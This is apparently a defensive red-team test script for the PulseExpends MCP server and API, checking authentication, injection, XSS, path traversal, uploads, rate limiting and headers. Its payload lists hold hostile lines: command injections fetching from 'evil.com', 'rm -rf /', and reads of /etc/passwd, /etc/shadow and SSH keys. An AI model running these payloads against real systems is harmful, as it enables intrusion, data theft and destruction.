#!/usr/bin/env python3
"""
Red Team Security Tests for PulseExpends MCP Server and API

This script performs security testing including:
1. Authentication/Authorization bypass attempts
2. Input validation testing
3. Injection attacks (SQL, Command, XSS)
4. Rate limiting testing
5. File upload security
6. API endpoint security
7. Data exposure testing
"""

import requests
import json
import time
import random
import string
import subprocess
import sys
from typing import Dict, List, Optional, Tuple
from urllib.parse import urljoin
import argparse
import logging

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class RedTeamTester:
    def __init__(self, base_url: str, verbose: bool = False):
        self.base_url = base_url.rstrip('/')
        self.verbose = verbose
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'RedTeamSecurityTester/1.0',
            'Content-Type': 'application/json'
        })
        
        # Test data
        self.test_circle_id = "test-circle-redteam"
        self.test_user_id = "test-user-redteam"
        self.test_transaction_id = "test-tx-redteam"
        
        # Security test patterns
        self.injection_patterns = {
            'sql_injection': [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' /*",
                "'; DROP TABLE users; --",
                "' UNION SELECT username, password FROM users --",
                "' OR 1=1--",
                "admin'--",
                "' OR 'a'='a",
                "' OR 'a'='a'--",
                "' OR 'a'='a' /*",
            ],
            'xss_payloads': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg/onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<body onload=alert('XSS')>",
                "<iframe src=javascript:alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<marquee onstart=alert('XSS')>",
                "<details open ontoggle=alert('XSS')>",
                "<video><source onerror=alert('XSS')>",
            ],
            'command_injection': [
                "; ls -la",
                "| cat /etc/passwd",
                "&& whoami",
                "`id`",
                "$(id)",
                "|| ping -c 1 127.0.0.1",
                "; python -c 'import os; os.system(\"id\")'",
                "| wget http://evil.com/malware",
                "&& curl http://evil.com/malware",
                "; rm -rf /",
            ],
            'path_traversal': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\SAM",
                "/etc/passwd",
                "C:\\Windows\\System32\\config\\SAM",
                "../../../proc/self/environ",
                "../../../var/log/auth.log",
                "../../../etc/shadow",
                "../../../root/.ssh/id_rsa",
                "../../../etc/hosts",
                "../../../etc/ssl/private/ssl-cert-snakeoil.key",
            ],
            'no_sql_injection': [
                '{"$ne": null}',
                '{"$gt": ""}',
                '{"$where": "1==1"}',
                '{"$regex": ".*"}',
                '{"$exists": true}',
                '{"$nin": []}',
                '{"$in": ["admin"]}',
                '{"$or": [{"user": "admin"}, {"pass": {"$ne": null}}]}',
                '{"$and": [{"user": {"$ne": null}}, {"pass": {"$ne": null}}]}',
                '{"$where": "this.user == \\"admin\\""}',
            ]
        }
    
    def log_test(self, test_name: str, status: str, details: str = ""):
        """Log test result"""
        color = {
            'PASS': '\033[92m',  # Green
            'FAIL': '\033[91m',  # Red
            'WARN': '\033[93m',  # Yellow
            'INFO': '\033[94m',  # Blue
        }.get(status, '\033[0m')
        
        reset = '\033[0m'
        logger.info(f"{color}[{status}]{reset} {test_name}")
        if details and self.verbose:
            logger.info(f"  Details: {details}")
    
    def test_authentication_bypass(self) -> Dict:
        """Test authentication/authorization bypass attempts"""
        results = {
            'passed': [],
            'failed': [],
            'warnings': []
        }
        
        endpoints_to_test = [
            '/api/v1/transactions',
            '/api/v1/circles',
            '/api/v1/analytics/monthly-summary/test-circle',
            '/mcp/tools/save_transaction/execute',
            '/mcp/tools/create_family_circle/execute',
        ]
        
        # Test without authentication
        for endpoint in endpoints_to_test:
            url = urljoin(self.base_url, endpoint)
            
            # Test GET requests
            response = self.session.get(url)
            if response.status_code == 401 or response.status_code == 403:
                self.log_test(f"Authentication required for GET {endpoint}", "PASS")
                results['passed'].append(f"GET {endpoint}")
            elif response.status_code == 200:
                self.log_test(f"Authentication bypass possible for GET {endpoint}", "FAIL", 
                            f"Status: {response.status_code}")
                results['failed'].append(f"GET {endpoint}")
            else:
                self.log_test(f"Unexpected response for GET {endpoint}", "WARN",
                            f"Status: {response.status_code}")
                results['warnings'].append(f"GET {endpoint}")
            
            # Test POST requests
            if endpoint not in ['/api/v1/analytics/monthly-summary/test-circle']:
                test_data = {"test": "data"}
                response = self.session.post(url, json=test_data)
                if response.status_code == 401 or response.status_code == 403:
                    self.log_test(f"Authentication required for POST {endpoint}", "PASS")
                    results['passed'].append(f"POST {endpoint}")
                elif response.status_code == 200 or response.status_code == 201:
                    self.log_test(f"Authentication bypass possible for POST {endpoint}", "FAIL",
                                f"Status: {response.status_code}")
                    results['failed'].append(f"POST {endpoint}")
                else:
                    self.log_test(f"Unexpected response for POST {endpoint}", "WARN",
                                f"Status: {response.status_code}")
                    results['warnings'].append(f"POST {endpoint}")
        
        return results
    
    def test_sql_injection(self) -> Dict:
        """Test SQL injection vulnerabilities"""
        results = {
            'passed': [],
            'failed': [],
            'warnings': []
        }
        
        test_endpoints = [
            ('/api/v1/transactions', 'GET', {'circle_id': 'test'}),
            ('/api/v1/transactions/summary', 'GET', {'circle_id': 'test'}),
            ('/mcp/tools/get_transactions/execute', 'POST', {'circle_id': 'test'}),
            ('/mcp/tools/get_family_circle/execute', 'POST', {'circle_id': 'test'}),
        ]
        
        for endpoint, method, base_params in test_endpoints:
            url = urljoin(self.base_url, endpoint)
            
            for injection in self.injection_patterns['sql_injection']:
                # Test in different parameter positions
                test_params = base_params.copy()
                
                if 'circle_id' in test_params:
                    test_params['circle_id'] = f"test{injection}"
                
                # Add injection to other possible fields
                test_params['test_field'] = injection
                
                try:
                    if method == 'GET':
                        response = self.session.get(url, params=test_params)
                    else:  # POST
                        response = self.session.post(url, json={'params': test_params})
                    
                    # Check for SQL error messages
                    error_indicators = [
                        'sql', 'SQL', 'syntax', 'Syntax', 'mysql', 'MySQL',
                        'postgres', 'PostgreSQL', 'database', 'Database',
                        'query', 'Query', 'exec', 'Exec', 'statement', 'Statement'
                    ]
                    
                    response_text = response.text.lower()
                    has_sql_error = any(indicator in response_text for indicator in [e.lower() for e in error_indicators])
                    
                    if has_sql_error:
                        self.log_test(f"SQL injection possible in {endpoint}", "FAIL",
                                    f"Payload: {injection[:50]}...")
                        results['failed'].append(f"{endpoint} - {injection[:30]}")
                    elif response.status_code == 500:
                        self.log_test(f"Server error with SQL injection in {endpoint}", "WARN",
                                    f"Payload: {injection[:50]}... Status: {response.status_code}")
                        results['warnings'].append(f"{endpoint} - {injection[:30]}")
                    else:
                        self.log_test(f"SQL injection blocked in {endpoint}", "PASS",
                                    f"Payload: {injection[:50]}...")
                        results['passed'].append(f"{endpoint} - {injection[:30]}")
                        
                except Exception as e:
                    self.log_test(f"Error testing SQL injection in {endpoint}", "WARN",
                                f"Payload: {injection[:50]}... Error: {str(e)}")
                    results['warnings'].append(f"{endpoint} - {injection[:30]}")
        
        return results
    
    def test_xss_injection(self) -> Dict:
        """Test XSS vulnerabilities"""
        results = {
            'passed': [],
            'failed': [],
            'warnings': []
        }
        
        # Test endpoints that accept user input
        test_endpoints = [
            ('/mcp/tools/save_transaction/execute', 'POST', {
                'circle_id': 'test-circle',
                'user_id': 'test-user',
                'amount': -1000,
                'description': 'XSS_TEST',
                'currency': 'CLP'
            }),
            ('/mcp/tools/create_family_circle/execute', 'POST', {
                'name': 'Test Circle',
                'description': 'XSS_TEST',
                'currency': 'CLP'
            }),
        ]
        
        for endpoint, method, base_params in test_endpoints:
            url = urljoin(self.base_url, endpoint)
            
            for xss_payload in self.injection_patterns['xss_payloads']:
                test_params = base_params.copy()
                
                # Inject into string fields
                for key in test_params:
                    if isinstance(test_params[key], str):
                        test_params[key] = xss_payload
                
                try:
                    response = self.session.post(url, json={'params': test_params})
                    
                    # Check if payload is reflected in response
                    response_text = response.text
                    if xss_payload in response_text:
                        self.log_test(f"XSS possible in {endpoint}", "FAIL",
                                    f"Payload reflected: {xss_payload[:50]}...")
                        results['failed'].append(f"{endpoint} - {xss_payload[:30]}")
                    elif response.status_code == 400 or response.status_code == 422:
                        self.log_test(f"XSS blocked in {endpoint}", "PASS",
                                    f"Payload: {xss_payload[:50]}... Status: {response.status_code}")
                        results['passed'].append(f"{endpoint} - {xss_payload[:30]}")
                    else:
                        self.log_test(f"XSS test inconclusive for {endpoint}", "WARN",
                                    f"Payload: {xss_payload[:50]}... Status: {response.status_code}")
                        results['warnings'].append(f"{endpoint} - {xss_payload[:30]}")
                        
                except Exception as e:
                    self.log_test(f"Error testing XSS in {endpoint}", "WARN",
                                f"Payload: {xss_payload[:50]}... Error: {str(e)}")
                    results['warnings'].append(f"{endpoint} - {xss_payload[:30]}")
        
        return results
    
    def test_command_injection(self) -> Dict:
        """Test command injection vulnerabilities"""
        results = {
            'passed': [],
            'failed': [],
            'warnings': []
        }
        
        # Test file upload endpoint if it exists
        upload_endpoint = '/parse/upload'
        url = urljoin(self.base_url, upload_endpoint)
        
        for cmd_injection in self.injection_patterns['command_injection']:
            # Create a test file with injection in filename
            files = {
                'file': (f'test{cmd_injection}.pdf', b'%PDF fake content', 'application/pdf')
            }
            
            data = {
                'document_type': 'credit_card',
                'bank_name': cmd_injection  # Also test in form fields
            }
            
            try:
                response = self.session.post(url, files=files, data=data)
                
                # Check for command execution indicators
                response_text = response.text.lower()
                cmd_indicators = [
                    'command', 'exec', 'shell', 'process', 'permission',
                    'not found', 'no such file', 'cannot execute'
                ]
                
                has_cmd_indicator = any(indicator in response_text for indicator in cmd_indicators)
                
                if has_cmd_indicator:
                    self.log_test(f"Command injection possible in {upload_endpoint}", "FAIL",
                                f"Payload: {cmd_injection[:50]}...")
                    results['failed'].append(f"{upload_endpoint} - {cmd_injection[:30]}")
                elif response.status_code == 400 or response.status_code == 422:
                    self.log_test(f"Command injection blocked in {upload_endpoint}", "PASS",
                                f"Payload: {cmd_injection[:50]}...")
                    results['passed'].append(f"{upload_endpoint} - {cmd_injection[:30]}")
                else:
                    self.log_test(f"Command injection test inconclusive for {upload_endpoint}", "WARN",
                                f"Payload: {cmd_injection[:50]}... Status: {response.status_code}")
                    results['warnings'].append(f"{upload_endpoint} - {cmd_injection[:30]}")
                    
            except Exception as e:
                self.log_test(f"Error testing command injection in {upload_endpoint}", "WARN",
                            f"Payload: {cmd_injection[:50]}... Error: {str(e)}")
                results['warnings'].append(f"{upload_endpoint} - {cmd_injection[:30]}")
        
        return results
    
    def test_path_traversal(self) -> Dict:
        """Test path traversal vulnerabilities"""
        results = {
            'passed': [],
            'failed': [],
            'warnings': []
        }
        
        # Test document URL endpoints
        test_endpoints = [
            ('/parse/url', 'POST', {'document_url': 'http://example.com/test.pdf'}),
            ('/parse/obs', 'POST', {'document_url': 'obs://bucket/test.pdf'}),
        ]
        
        for endpoint, method, base_params in test_endpoints:
            url = urljoin(self.base_url, endpoint)
            
            for traversal in self.injection_patterns['path_traversal']:
                test_params = base_params.copy()
                
                # Test in document_url parameter
                if endpoint == '/parse/url':
                    test_params['document_url'] = f'http://example.com/{traversal}'
                elif endpoint == '/parse/obs':
                    test_params['document_url'] = f'obs://bucket/{traversal}'
                
                try:
                    response = self.session.post(url, json=test_params)
                    
                    # Check for path traversal indicators
                    response_text = response.text.lower()
                    traversal_indicators = [
                        'path', 'directory', 'file', 'permission', 'access',
                        'forbidden', 'not allowed', 'traversal', 'invalid path'
                    ]
                    
                    has_traversal_indicator = any(indicator in response_text for indicator in traversal_indicators)
                    
                    if has_traversal_indicator or response.status_code == 400:
                        self.log_test(f"Path traversal blocked in {endpoint}", "PASS",
                                    f"Payload: {traversal[:50]}... Status: {response.status_code}")
                        results['passed'].append(f"{endpoint} - {traversal[:30]}")
                    elif response.status_code == 200:
                        self.log_test(f"Path traversal possible in {endpoint}", "FAIL",
                                    f"Payload: {traversal[:50]}... Status: {response.status_code}")
                        results['failed'].append(f"{endpoint} - {traversal[:30]}")
                    else:
                        self.log_test(f"Path traversal test inconclusive for {endpoint}", "WARN",
                                    f"Payload: {traversal[:50]}... Status: {response.status_code}")
                        results['warnings'].append(f"{endpoint} - {traversal[:30]}")
                        
                except Exception as e:
                    self.log_test(f"Error testing path traversal in {endpoint}", "WARN",
                                f"Payload: {traversal[:50]}... Error: {str(e)}")
                    results['warnings'].append(f"{endpoint} - {traversal[:30]}")
        
        return results
    
    def test_rate_limiting(self) -> Dict:
        """Test rate limiting implementation"""
        results = {
            'passed': [],
            'failed': [],
            'warnings': []
        }
        
        endpoints_to_test = [
            '/health',
            '/api/v1/transactions/summary?circle_id=test',
            '/mcp/tools',
        ]
        
        for endpoint in endpoints_to_test:
            url = urljoin(self.base_url, endpoint)
            
            # Make rapid requests
            responses = []
            for i in range(20):  # 20 rapid requests
                try:
                    response = self.session.get(url)
                    responses.append(response.status_code)
                    time.sleep(0.05)  # Small delay between requests
                except Exception as e:
                    responses.append(str(e))
            
            # Check for rate limiting (429 status code)
            rate_limited = any(status == 429 for status in responses if isinstance(status, int))
            
            if rate_limited:
                self.log_test(f"Rate limiting active for {endpoint}", "PASS")
                results['passed'].append(endpoint)
            else:
                # Check if we're getting throttled in other ways
                late_responses = responses[10:]  # Last 10 responses
                errors = [r for r in late_responses if isinstance(r, int) and r >= 400]
                
                if errors:
                    self.log_test(f"Possible rate limiting for {endpoint}", "WARN",
                                f"Error rate: {len(errors)}/{len(late_responses)}")
                    results['warnings'].append(endpoint)
                else:
                    self.log_test(f"No rate limiting detected for {endpoint}", "FAIL",
                                "Consider implementing rate limiting")
                    results['failed'].append(endpoint)
        
        return results
    
    def test_file_upload_security(self) -> Dict:
        """Test file upload security"""
        results = {
            'passed': [],
            'failed': [],
            'warnings': []
        }
        
        upload_endpoint = '/parse/upload'
        url = urljoin(self.base_url, upload_endpoint)
        
        # Test 1: Valid PDF file
        valid_pdf = b'%PDF-1.4\n1 0 obj\n<<>>\nendobj\nxref\n0 1\n0000000000 65535 f \ntrailer\n<<>>\nstartxref\n10\n%%EOF'
        
        files = {'file': ('test.pdf', valid_pdf, 'application/pdf')}
        data = {'document_type': 'credit_card'}
        
        try:
            response = self.session.post(url, files=files, data=data)
            if response.status_code == 200:
                self.log_test("Valid PDF upload accepted", "PASS")
                results['passed'].append("Valid PDF")
            else:
                self.log_test("Valid PDF upload rejected", "WARN",
                            f"Status: {response.status_code}")
                results['warnings'].append("Valid PDF")
        except Exception as e:
            self.log_test("Error testing valid PDF upload", "WARN", str(e))
            results['warnings'].append("Valid PDF")
        
        # Test 2: Invalid file type (executable)
        files = {'file': ('test.exe', b'MZ\x90\x00\x03\x00\x00\x00\x04', 'application/x-msdownload')}
        
        try:
            response = self.session.post(url, files=files, data=data)
            if response.status_code == 400 or response.status_code == 415:
                self.log_test("Executable file rejected", "PASS")
                results['passed'].append("Executable file")
            elif response.status_code == 200:
                self.log_test("Executable file accepted - SECURITY RISK", "FAIL")
                results['failed'].append("Executable file")
            else:
                self.log_test("Executable file test inconclusive", "WARN",
                            f"Status: {response.status_code}")
                results['warnings'].append("Executable file")
        except Exception as e:
            self.log_test("Error testing executable upload", "WARN", str(e))
            results['warnings'].append("Executable file")
        
        # Test 3: Large file (simulate DoS)
        large_file = b'A' * (10 * 1024 * 1024)  # 10MB
        
        files = {'file': ('large.pdf', large_file, 'application/pdf')}
        
        try:
            response = self.session.post(url, files=files, data=data, timeout=30)
            if response.status_code == 413:
                self.log_test("Large file size limit enforced", "PASS")
                results['passed'].append("Large file")
            elif response.status_code == 200:
                self.log_test("Large file accepted - possible DoS risk", "WARN",
                            "Consider implementing file size limits")
                results['warnings'].append("Large file")
            else:
                self.log_test("Large file test inconclusive", "WARN",
                            f"Status: {response.status_code}")
                results['warnings'].append("Large file")
        except requests.exceptions.Timeout:
            self.log_test("Large file caused timeout - possible DoS vulnerability", "FAIL")
            results['failed'].append("Large file")
        except Exception as e:
            self.log_test("Error testing large file upload", "WARN", str(e))
            results['warnings'].append("Large file")
        
        # Test 4: Malformed PDF
        malformed_pdf = b'Not a real PDF file'
        
        files = {'file': ('malformed.pdf', malformed_pdf, 'application/pdf')}
        
        try:
            response = self.session.post(url, files=files, data=data)
            if response.status_code == 400 or response.status_code == 422:
                self.log_test("Malformed PDF rejected", "PASS")
                results['passed'].append("Malformed PDF")
            elif response.status_code == 200:
                self.log_test("Malformed PDF accepted - parser may crash", "WARN")
                results['warnings'].append("Malformed PDF")
            else:
                self.log_test("Malformed PDF test inconclusive", "WARN",
                            f"Status: {response.status_code}")
                results['warnings'].append("Malformed PDF")
        except Exception as e:
            self.log_test("Error testing malformed PDF", "WARN", str(e))
            results['warnings'].append("Malformed PDF")
        
        # Test 5: ZIP bomb (small test)
        zip_bomb = b'PK\x03\x04' + (b'\x00' * 1000)  # Small ZIP header
        
        files = {'file': ('test.zip', zip_bomb, 'application/zip')}
        
        try:
            response = self.session.post(url, files=files, data=data)
            if response.status_code == 400 or response.status_code == 415:
                self.log_test("ZIP file rejected", "PASS")
                results['passed'].append("ZIP file")
            elif response.status_code == 200:
                self.log_test("ZIP file accepted - possible decompression bomb risk", "WARN")
                results['warnings'].append("ZIP file")
            else:
                self.log_test("ZIP file test inconclusive", "WARN",
                            f"Status: {response.status_code}")
                results['warnings'].append("ZIP file")
        except Exception as e:
            self.log_test("Error testing ZIP file", "WARN", str(e))
            results['warnings'].append("ZIP file")
        
        return results
    
    def test_sensitive_data_exposure(self) -> Dict:
        """Test for sensitive data exposure"""
        results = {
            'passed': [],
            'failed': [],
            'warnings': []
        }
        
        # Test error messages for information disclosure
        endpoints_to_test = [
            ('/api/v1/transactions/invalid-id', 'GET'),
            ('/mcp/tools/nonexistent/execute', 'POST'),
            ('/result/nonexistent', 'GET'),
        ]
        
        for endpoint, method in endpoints_to_test:
            url = urljoin(self.base_url, endpoint)
            
            try:
                if method == 'GET':
                    response = self.session.get(url)
                else:  # POST
                    response = self.session.post(url, json={'test': 'data'})
                
                response_text = response.text.lower()
                
                # Check for sensitive information in error messages
                sensitive_patterns = [
                    'stack trace', 'traceback', 'at line',
                    'file:', 'directory:', 'path:',
                    'database', 'sql', 'query',
                    'password', 'secret', 'key', 'token',
                    'internal server error', 'exception'
                ]
                
                has_sensitive_info = any(pattern in response_text for pattern in sensitive_patterns)
                
                if has_sensitive_info:
                    self.log_test(f"Sensitive data exposure in {endpoint}", "FAIL",
                                "Error message contains sensitive information")
                    results['failed'].append(endpoint)
                elif response.status_code == 404 or response.status_code == 400:
                    self.log_test(f"Proper error handling in {endpoint}", "PASS",
                                f"Status: {response.status_code}")
                    results['passed'].append(endpoint)
                else:
                    self.log_test(f"Error handling test inconclusive for {endpoint}", "WARN",
                                f"Status: {response.status_code}")
                    results['warnings'].append(endpoint)
                    
            except Exception as e:
                self.log_test(f"Error testing {endpoint}", "WARN", str(e))
                results['warnings'].append(endpoint)
        
        # Test CORS headers for information disclosure
        response = self.session.options(urljoin(self.base_url, '/health'))
        cors_headers = response.headers.get('access-control-allow-origin', '')
        
        if cors_headers == '*':
            self.log_test("CORS allows all origins - information disclosure risk", "WARN",
                        "Consider restricting CORS to specific origins")
            results['warnings'].append("CORS configuration")
        elif cors_headers:
            self.log_test("CORS properly configured", "PASS")
            results['passed'].append("CORS configuration")
        else:
            self.log_test("No CORS headers - may cause issues for web clients", "WARN")
            results['warnings'].append("CORS configuration")
        
        return results
    
    def test_api_endpoint_security(self) -> Dict:
        """Test API endpoint security"""
        results = {
            'passed': [],
            'failed': [],
            'warnings': []
        }
        
        # Test HTTP methods
        endpoints = [
            '/health',
            '/api/v1/transactions',
            '/mcp/tools',
            '/docs',
            '/redoc',
        ]
        
        dangerous_methods = ['PUT', 'DELETE', 'PATCH', 'TRACE', 'CONNECT']
        
        for endpoint in endpoints:
            url = urljoin(self.base_url, endpoint)
            
            for method in dangerous_methods:
                try:
                    response = self.session.request(method, url)
                    
                    if method in ['PUT', 'DELETE', 'PATCH']:
                        if response.status_code == 405:  # Method Not Allowed
                            self.log_test(f"{method} method blocked for {endpoint}", "PASS")
                            results['passed'].append(f"{endpoint} - {method}")
                        elif response.status_code == 200 or response.status_code == 201:
                            self.log_test(f"{method} method allowed for {endpoint} - potential risk", "FAIL")
                            results['failed'].append(f"{endpoint} - {method}")
                        else:
                            self.log_test(f"{method} method test for {endpoint}", "WARN",
                                        f"Status: {response.status_code}")
                            results['warnings'].append(f"{endpoint} - {method}")
                    else:  # TRACE, CONNECT
                        if response.status_code == 405 or response.status_code == 501:
                            self.log_test(f"{method} method blocked for {endpoint}", "PASS")
                            results['passed'].append(f"{endpoint} - {method}")
                        else:
                            self.log_test(f"{method} method test for {endpoint}", "WARN",
                                        f"Status: {response.status_code}")
                            results['warnings'].append(f"{endpoint} - {method}")
                            
                except Exception as e:
                    self.log_test(f"Error testing {method} for {endpoint}", "WARN", str(e))
                    results['warnings'].append(f"{endpoint} - {method}")
        
        # Test for missing security headers
        response = self.session.get(urljoin(self.base_url, '/health'))
        security_headers = [
            'X-Content-Type-Options',
            'X-Frame-Options',
            'X-XSS-Protection',
            'Strict-Transport-Security',
            'Content-Security-Policy',
        ]
        
        missing_headers = []
        for header in security_headers:
            if header not in response.headers:
                missing_headers.append(header)
        
        if missing_headers:
            self.log_test("Missing security headers", "WARN",
                        f"Missing: {', '.join(missing_headers)}")
            results['warnings'].append(f"Security headers: {', '.join(missing_headers)}")
        else:
            self.log_test("Security headers present", "PASS")
            results['passed'].append("Security headers")
        
        return results
    
    def run_all_tests(self) -> Dict:
        """Run all security tests"""
        logger.info("=" * 80)
        logger.info("Starting Red Team Security Tests")
        logger.info(f"Target: {self.base_url}")
        logger.info("=" * 80)
        
        all_results = {}
        
        # Run all tests
        tests = [
            ("Authentication Bypass", self.test_authentication_bypass),
            ("SQL Injection", self.test_sql_injection),
            ("XSS Injection", self.test_xss_injection),
            ("Command Injection", self.test_command_injection),
            ("Path Traversal", self.test_path_traversal),
            ("Rate Limiting", self.test_rate_limiting),
            ("File Upload Security", self.test_file_upload_security),
            ("Sensitive Data Exposure", self.test_sensitive_data_exposure),
            ("API Endpoint Security", self.test_api_endpoint_security),
        ]
        
        for test_name, test_func in tests:
            logger.info(f"\n{'='*40}")
            logger.info(f"Running: {test_name}")
            logger.info(f"{'='*40}")
            
            try:
                results = test_func()
                all_results[test_name] = results
                
                # Log summary
                passed = len(results['passed'])
                failed = len(results['failed'])
                warnings = len(results['warnings'])
                
                logger.info(f"\nSummary for {test_name}:")
                logger.info(f"  PASSED: {passed}")
                logger.info(f"  FAILED: {failed}")
                logger.info(f"  WARNINGS: {warnings}")
                
                if failed > 0:
                    logger.error(f"  ❌ {test_name} has {failed} FAILURES that need immediate attention!")
                
            except Exception as e:
                logger.error(f"Error running {test_name}: {str(e)}")
                all_results[test_name] = {
                    'error': str(e),
                    'passed': [],
                    'failed': [],
                    'warnings': []
                }
        
        # Generate final report
        self.generate_report(all_results)
        
        return all_results
    
    def generate_report(self, results: Dict):
        """Generate security test report"""
        logger.info("\n" + "="*80)
        logger.info("SECURITY TEST REPORT")
        logger.info("="*80)
        
        total_passed = 0
        total_failed = 0
        total_warnings = 0
        
        for test_name, test_results in results.items():
            if 'error' in test_results:
                logger.error(f"\n{test_name}: ERROR - {test_results['error']}")
                continue
                
            passed = len(test_results['passed'])
            failed = len(test_results['failed'])
            warnings = len(test_results['warnings'])
            
            total_passed += passed
            total_failed += failed
            total_warnings += warnings
            
            logger.info(f"\n{test_name}:")
            logger.info(f"  ✓ PASSED: {passed}")
            logger.info(f"  ✗ FAILED: {failed}")
            logger.info(f"  ⚠ WARNINGS: {warnings}")
            
            if failed > 0:
                logger.error(f"  Critical failures found!")
                for failure in test_results['failed'][:5]:  # Show first 5 failures
                    logger.error(f"    - {failure}")
                if len(test_results['failed']) > 5:
                    logger.error(f"    ... and {len(test_results['failed']) - 5} more")
        
        logger.info("\n" + "="*80)
        logger.info("OVERALL SUMMARY")
        logger.info("="*80)
        logger.info(f"Total PASSED: {total_passed}")
        logger.info(f"Total FAILED: {total_failed}")
        logger.info(f"Total WARNINGS: {total_warnings}")
        
        if total_failed == 0 and total_warnings == 0:
            logger.info("\n✅ All tests PASSED! System appears secure.")
        elif total_failed == 0:
            logger.info("\n⚠ Some warnings found. Review recommended.")
        else:
            logger.error("\n❌ CRITICAL FAILURES FOUND! Immediate action required.")
        
        # Generate recommendations
        logger.info("\n" + "="*80)
        logger.info("RECOMMENDATIONS")
        logger.info("="*80)
        
        recommendations = []
        
        # Check for common issues and provide recommendations
        for test_name, test_results in results.items():
            if 'error' in test_results:
                continue
                
            if test_name == "Authentication Bypass" and test_results['failed']:
                recommendations.append("🔒 Implement proper authentication and authorization for all endpoints")
            
            if test_name == "SQL Injection" and test_results['failed']:
                recommendations.append("🛡️ Implement parameterized queries and input validation for SQL injection protection")
            
            if test_name == "XSS Injection" and test_results['failed']:
                recommendations.append("🛡️ Implement output encoding and Content Security Policy (CSP) for XSS protection")
            
            if test_name == "Command Injection" and test_results['failed']:
                recommendations.append("🛡️ Use safe APIs for command execution and validate/sanitize all inputs")
            
            if test_name == "Path Traversal" and test_results['failed']:
                recommendations.append("🛡️ Implement path validation and use safe file access APIs")
            
            if test_name == "Rate Limiting" and test_results['failed']:
                recommendations.append("⚡ Implement rate limiting to prevent DoS attacks")
            
            if test_name == "File Upload Security" and test_results['failed']:
                recommendations.append("📁 Implement file type validation, size limits, and virus scanning for uploads")
            
            if test_name == "Sensitive Data Exposure" and test_results['failed']:
                recommendations.append("🔐 Ensure error messages don't leak sensitive information")
            
            if test_name == "API Endpoint Security" and test_results['failed']:
                recommendations.append("🔧 Restrict HTTP methods and add security headers")
        
        # Add general recommendations
        if not any("authentication" in r.lower() for r in recommendations):
            recommendations.append("✅ Authentication appears properly implemented")
        
        if not any("sql" in r.lower() for r in recommendations):
            recommendations.append("✅ SQL injection protection appears adequate")
        
        if not any("xss" in r.lower() for r in recommendations):
            recommendations.append("✅ XSS protection appears adequate")
        
        # Log recommendations
        if recommendations:
            for i, rec in enumerate(recommendations, 1):
                logger.info(f"{i}. {rec}")
        else:
            logger.info("No specific recommendations. Security posture appears good.")
        
        logger.info("\n" + "="*80)
        logger.info("NEXT STEPS")
        logger.info("="*80)
        logger.info("1. Address all FAILED tests immediately")
        logger.info("2. Review WARNINGS and fix where applicable")
        logger.info("3. Run penetration testing in staging environment")
        logger.info("4. Implement Web Application Firewall (WAF)")
        logger.info("5. Regular security audits and dependency updates")
        logger.info("6. Monitor logs for suspicious activity")
        
        return recommendations

def main():
    parser = argparse.ArgumentParser(description='Red Team Security Tests for PulseExpends')
    parser.add_argument('--url', default='http://localhost:8080',
                       help='Base URL of the application (default: http://localhost:8080)')
    parser.add_argument('--verbose', '-v', action='store_true',
                       help='Enable verbose output')
    parser.add_argument('--output', '-o',
                       help='Output file for JSON report')
    
    args = parser.parse_args()
    
    # Create tester
    tester = RedTeamTester(args.url, args.verbose)
    
    # Run all tests
    results = tester.run_all_tests()
    
    # Save report if output specified
    if args.output:
        report = {
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'target': args.url,
            'results': results
        }
        
        with open(args.output, 'w') as f:
            json.dump(report, f, indent=2, default=str)
        
        logger.info(f"\nReport saved to {args.output}")
    
    # Exit with appropriate code
    total_failed = 0
    for test_results in results.values():
        if 'error' not in test_results:
            total_failed += len(test_results['failed'])
    
    if total_failed > 0:
        logger.error(f"\n❌ Security tests failed with {total_failed} critical issues")
        sys.exit(1)
    else:
        logger.info("\n✅ All security tests passed or have only warnings")
        sys.exit(0)

if __name__ == '__main__':
    main()